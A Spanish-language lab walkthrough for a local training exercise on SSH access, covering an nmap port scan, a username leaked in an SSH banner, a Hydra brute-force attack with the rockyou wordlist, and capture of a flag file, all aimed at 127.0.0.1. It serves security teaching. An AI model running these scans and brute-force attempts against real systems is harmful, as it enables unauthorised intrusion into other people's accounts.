# 📖 Guía — Lab 1: Acceso inicial por SSH

**Categoría:** 🟢 BASIC  
**Técnica:** Banner leak + enumeración de puertos + fuerza bruta  
**Dificultad:** ⭐ Fácil  

---

## 🎯 Objetivo

Obtener acceso a un sistema Linux mediante SSH en un puerto no estándar,  
aprovechando información filtrada en el banner del servicio.

**Flag final:** `/tmp/flag.txt`

---

## 🧠 Concepto previo

Antes de empezar, conviene entender dos cosas:

**¿Qué es un banner SSH?**  
Cuando te conectas a un servidor SSH, antes de pedirte contraseña puede mostrar un mensaje de texto personalizado. Es útil para avisos legales, pero si el administrador comete el error de incluir información sensible (como un nombre de usuario), se convierte en una vulnerabilidad de reconocimiento.

**¿Qué es la fuerza bruta con diccionario?**  
En vez de probar todas las combinaciones posibles, usamos una lista de contraseñas conocidas (como `rockyou.txt`) que contiene millones de contraseñas reales filtradas en brechas de seguridad.

---

## 🚀 Levantar el laboratorio

```bash
./launch.sh lab1
```

O manualmente:
```bash
cd labs/basic/lab1-ssh
./build_and_run.sh
```

Verás algo como:
```
[+] Lab 1 corriendo. IP objetivo: 127.0.0.1
[+] Puertos expuestos: 45768, 8080, 8443, 9090, 3306, 6379, 27017
```

---

## 🔍 Solución paso a paso

### Paso 1 — Escaneo de puertos

El SSH no está en el puerto 22. Hay que encontrarlo.

```bash
nmap -p- -T4 127.0.0.1
```

- `-p-` escanea los 65535 puertos (no solo los comunes)
- `-T4` aumenta la velocidad del escaneo

Verás varios puertos abiertos. Entre ellos estará el SSH en un puerto alto.

> 💡 Si el escaneo completo es muy lento, puedes probar primero con los 10.000 primeros puertos:  
> `nmap -p 1-10000 -T4 127.0.0.1`

---

### Paso 2 — Identificar el servicio SSH

Una vez que tengas la lista de puertos, identifica cuál es SSH:

```bash
nmap -sV -p 45768,8080,8443,9090,3306,6379,27017 127.0.0.1
```

- `-sV` detecta el servicio y versión de cada puerto

---

### Paso 3 — Leer el banner SSH

Conéctate al puerto donde está el SSH. **No necesitas contraseña todavía**, el banner se muestra antes:

```bash
ssh -p 45768 127.0.0.1
```

Verás un mensaje de advertencia con información del sistema.  
**Léelo con atención.** Contiene el nombre de usuario que necesitas.

Pulsa `Ctrl+C` para salir sin autenticarte.

---

### Paso 4 — Fuerza bruta con Hydra

Ya tienes el usuario. Ahora a por la contraseña:

```bash
hydra -l USUARIO_ENCONTRADO -P /usr/share/wordlists/rockyou.txt \
  ssh://127.0.0.1 -s 45768 -t 4
```

- `-l` especifica el usuario (en minúsculas: un solo usuario)
- `-P` ruta al diccionario de contraseñas
- `-s 45768` indica el puerto no estándar
- `-t 4` número de hilos paralelos (no pongas más de 6 o el lab puede rechazarlos)

> ⏱️ Dependiendo de tu máquina puede tardar unos minutos. La contraseña está en las primeras páginas de rockyou.

---

### Paso 5 — Acceso y captura de la flag

```bash
ssh -p 45768 USUARIO_ENCONTRADO@127.0.0.1
# Introduce la contraseña encontrada
```

Una vez dentro:

```bash
ls /tmp
cat /tmp/flag.txt
```

---

## ✅ Verificación

Si has completado el lab correctamente, la flag tendrá este formato:

```
FLAG{...}
```

---

## 🛠️ Solución de problemas

| Problema | Posible causa | Solución |
|---|---|---|
| `Connection refused` en el 22 | Normal, SSH no está ahí | Escanear bien con nmap |
| Hydra no encuentra la contraseña | Diccionario incorrecto o usuario mal escrito | Verificar el usuario del banner |
| El banner no aparece | Problema de configuración | Reconstruir con `docker build --no-cache` |
| Hydra muy lento | Pocos threads o red saturada | Usar `-t 6` con cuidado |
| `Too many authentication failures` | Demasiados intentos seguidos | Esperar 30 segundos y reintentar |

---

## 📚 Recursos para aprender más

- [Hydra - THC](https://github.com/vanhauser-thc/thc-hydra) — documentación oficial
- [rockyou.txt explicado](https://en.wikipedia.org/wiki/RockYou#Data_breach) — qué es y de dónde viene
- [SSH Banner en sshd_config](https://man.openbsd.org/sshd_config) — documentación oficial

---

*Laboratorio parte del proyecto [Lab Provisioner](../README.md)*
